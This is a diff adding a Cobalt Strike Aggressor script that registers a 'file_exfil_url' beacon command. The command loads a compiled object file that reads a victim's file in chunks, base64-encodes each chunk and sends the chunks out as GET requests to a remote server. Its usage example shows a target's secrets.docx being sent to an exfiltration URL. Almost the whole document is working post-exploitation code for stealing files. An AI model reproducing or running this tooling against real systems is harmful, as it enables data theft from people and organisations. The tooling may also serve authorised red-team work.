@@ -1,0 +1,37 @@
+# FileExfiltrationUrlEncoded BOF
+# Exfiltrate a file via URL-encoded GET requests
+
+beacon_command_register(
+    "file_exfil_url",
+    "Exfiltrate a file via chunked URL-encoded GET requests",
+    "Synopsis: file_exfil_url <file_path> <server_url>\n\n" .
+    "Reads a file in 2KB chunks, base64-encodes each chunk, and sends\n" .
+    "them as GET requests to the specified server URL. The request path\n" .
+    "format is: <url_path>/<chunk_index>/<total_chunks>/<base64_data>\n\n" .
+    "Arguments:\n" .
+    "  file_path   - Full path to the file to exfiltrate\n" .
+    "  server_url  - HTTP(S) URL of the receiving server\n\n" .
+    "Examples:\n" .
+    "  file_exfil_url C:\\Users\\target\\Documents\\secrets.docx http://10.0.0.1:8080/exfil"
+);
+
+alias file_exfil_url {
+    local('$bid $barch $handle $data $args');
+
+    $bid = $1;
+    $barch = barch($bid);
+
+    if ($3 is $null || strlen($3) == 0) {
+        berror($bid, "Usage: file_exfil_url <file_path> <server_url>");
+        return;
+    }
+
+    $handle = openf(script_resource("FileExfiltrationUrlEncoded." . $barch . ".o"));
+    $data = readb($handle, -1);
+    closef($handle);
+
+    $args = bof_pack($bid, "zz", $2, $3);
+
+    btask($bid, "Exfiltrating file: " . $2 . " to " . $3);
+    beacon_inline_execute($bid, $data, "go", $args);
+}
